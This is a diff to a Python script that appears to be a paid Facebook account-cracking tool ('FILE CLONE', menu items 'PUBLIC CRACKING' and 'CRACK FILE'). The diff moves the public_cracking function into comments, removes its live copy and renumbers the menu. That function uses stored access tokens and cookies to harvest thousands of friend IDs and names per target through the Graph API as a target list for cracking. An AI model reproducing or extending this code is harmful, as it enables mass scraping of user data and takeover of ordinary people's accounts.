@@ -454,7 +454,7 @@ logo ="""
  ┃ [+] AUTHOR    \033[1;91m: \033[1;92mSUPRAJ                            ┃
  ┃ [+] TOOL      \033[1;91m: \033[1;92mFILE CLONE                        ┃
  ┃ [+] STATUS    \033[1;91m: \033[1;92mPAID                              ┃
- ┃ [+] SYSTEM    \033[1;91m: \033[1;92mDATA[BEST] & WIFI\u001b[36mcV7\033[1;37m            ┃
+ ┃ [+] SYSTEM    \033[1;91m: \033[1;92mDATA[BEST] & WIFI\u001b[36m  V7\033[1;37m            ┃
  ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
 -----------------------------------------------"""   
 #------------------[ APPROVAL SYSTEM ]-------------------#
@@ -604,21 +604,115 @@ def login_lagi334():
 		print(e)
 
 #------------------[ MENU ]----------------#
- #===©===#
+#  #===©===#
+# class jalan:
+#     def __init__(self, z):
+#         for e in z + "\n":
+#             sys.stdout.write(e)
+#             sys.stdout.flush()
+#             time.sleep(0.040)
+# def menu():
+#     os.system('clear')
+#     print(logo)
+#     print("\033[1;37m[\u001b[36m•\033[1;37m] TODAY'S DATE :\033[1;93m "+date)
+#     print('\033[0;97m-----------------------------------------------')
+#     print(f"""[\u001b[36m1\033[1;37m] PUBLIC CRACKING """)
+#     print(f"""[\u001b[36m1\033[1;37m] CRACK FILE  """)
+#     print(f"""[\u001b[36m2\033[1;37m] CONTACT ADMIN""")
+#     print("""[\u001b[36m0\033[1;37m] LOGOUT""")
+#     print('\033[0;97m-----------------------------------------------')
+#     HEART = input('\033[1;37m[\u001b[36m•\033[1;37m] CHOOSE: ')
+#     if HEART in ['111']:
+#         login()
+#         dump_massal()
+#     elif HEART in ['1']:
+#         public_cracking()
+#     elif HEART in ['2']:
+#         crack_file()
+#     elif HEART in ['3','03']:
+#         os.system('xdg-open https://www.facebook.com/profile.php?id=100042145964429&mibextid=LQQJ4d')
+#         os.system("python TOXIC.py")
+#     elif HEART in ['0']:
+#         os.system('rm -rf .token.txt')
+#         os.system('rm -rf .cookie.txt')
+#         print('\033[0;97m-----------------------------------------------')
+#         animation(' [×] DONE EXIT ')
+#         exit()
+#     else:
+#         print('\033[0;97m-----------------------------------------------')
+#         animation(' [×] SELECT CORRECTLY ')
+#         back()
+
+# # ------------[ PUBLIC-CRACKING ]-----------------#
+# def public_cracking():
+#     try:
+#         token = open('.token.txt','r').read()
+#         cok = open('.cok.txt','r').read()
+#     except IOError:
+#         exit()
+#     try:
+#         os.system('clear')
+#         banner()
+#         info()
+#         jum = int(input(' [\u001b[36m•\033[1;37m] Enter The Number Of Idz You Want To Clone : '))
+#     except ValueError:
+#         linex()
+#         animation( ' >> Only Letters Are Accepted ')
+#         back()
+#     if jum<1 or jum>100:
+#         linex()
+#         animation(' >> Id Is Not Not Public ')
+#         back()
+#     ses=requests.Session()
+#     yz = 0
+#     for met in range(jum):
+#         yz+=1
+#         linex()
+#         kl = input(' [\u001b[36m•\033[1;37m] Enter Id '+str(yz)+' : ')
+#         uid.append(kl)
+#     for userr in uid:
+#         try:
+#             col = ses.get('https://graph.facebook.com/v2.0/'+userr+'?fields=friends.limit(5000)&access_token='+tokenku[0], cookies = {'cookies':cok}).json()
+#             for mi in col['friends']['data']:
+#                 try:
+#                     iso = (mi['id']+'|'+mi['name'])
+#                     if iso in id:pass
+#                     else:id.append(iso)
+#                 except:continue
+#         except (KeyError,IOError):
+#             pass
+#         except requests.exceptions.ConnectionError:
+#             linex()
+#             animation(' [×] Connection Lost ')
+#             exit()
+#     try:
+#         linex()
+#         print(f' [\u001b[36m•\033[1;37m] Total Idz \u001b[36m'+str(len(id)))
+#         setting()
+#     except requests.exceptions.ConnectionError:
+#         linex()
+#         animation(' [×] Connection Lost ')
+#         back()
+#     except (KeyError,IOError):
+#         animation(f' [×] Friendlist Is Not Public {x}')
+#         time.sleep(3)
+#         back()
+
 class jalan:
     def __init__(self, z):
         for e in z + "\n":
             sys.stdout.write(e)
             sys.stdout.flush()
             time.sleep(0.040)
+
 def menu():
     os.system('clear')
     print(logo)
     print("\033[1;37m[\u001b[36m•\033[1;37m] TODAY'S DATE :\033[1;93m "+date)
     print('\033[0;97m-----------------------------------------------')
     print(f"""[\u001b[36m1\033[1;37m] PUBLIC CRACKING """)
-    print(f"""[\u001b[36m1\033[1;37m] CRACK FILE  """)
-    print(f"""[\u001b[36m2\033[1;37m] CONTACT ADMIN""")
+    print(f"""[\u001b[36m2\033[1;37m] CRACK FILE  """)
+    print(f"""[\u001b[36m3\033[1;37m] CONTACT ADMIN""")
     print("""[\u001b[36m0\033[1;37m] LOGOUT""")
     print('\033[0;97m-----------------------------------------------')
     HEART = input('\033[1;37m[\u001b[36m•\033[1;37m] CHOOSE: ')
@@ -643,60 +737,6 @@ def menu():
         animation(' [×] SELECT CORRECTLY ')
         back()
 
-# ------------[ PUBLIC-CRACKING ]-----------------#
-def public_cracking():
-    try:
-        token = open('.token.txt','r').read()
-        cok = open('.cok.txt','r').read()
-    except IOError:
-        exit()
-    try:
-        os.system('clear')
-        banner()
-        info()
-        jum = int(input(' [\u001b[36m•\033[1;37m] Enter The Number Of Idz You Want To Clone : '))
-    except ValueError:
-        linex()
-        animation( ' >> Only Letters Are Accepted ')
-        back()
-    if jum<1 or jum>100:
-        linex()
-        animation(' >> Id Is Not Not Public ')
-        back()
-    ses=requests.Session()
-    yz = 0
-    for met in range(jum):
-        yz+=1
-        linex()
-        kl = input(' [\u001b[36m•\033[1;37m] Enter Id '+str(yz)+' : ')
-        uid.append(kl)
-    for userr in uid:
-        try:
-            col = ses.get('https://graph.facebook.com/v2.0/'+userr+'?fields=friends.limit(5000)&access_token='+tokenku[0], cookies = {'cookies':cok}).json()
-            for mi in col['friends']['data']:
-                try:
-                    iso = (mi['id']+'|'+mi['name'])
-                    if iso in id:pass
-                    else:id.append(iso)
-                except:continue
-        except (KeyError,IOError):
-            pass
-        except requests.exceptions.ConnectionError:
-            linex()
-            animation(' [×] Connection Lost ')
-            exit()
-    try:
-        linex()
-        print(f' [\u001b[36m•\033[1;37m] Total Idz \u001b[36m'+str(len(id)))
-        setting()
-    except requests.exceptions.ConnectionError:
-        linex()
-        animation(' [×] Connection Lost ')
-        back()
-    except (KeyError,IOError):
-        animation(f' [×] Friendlist Is Not Public {x}')
-        time.sleep(3)
-        back()
 
 #-------------[ CRACK-FROM-FILE ]------------------#
  
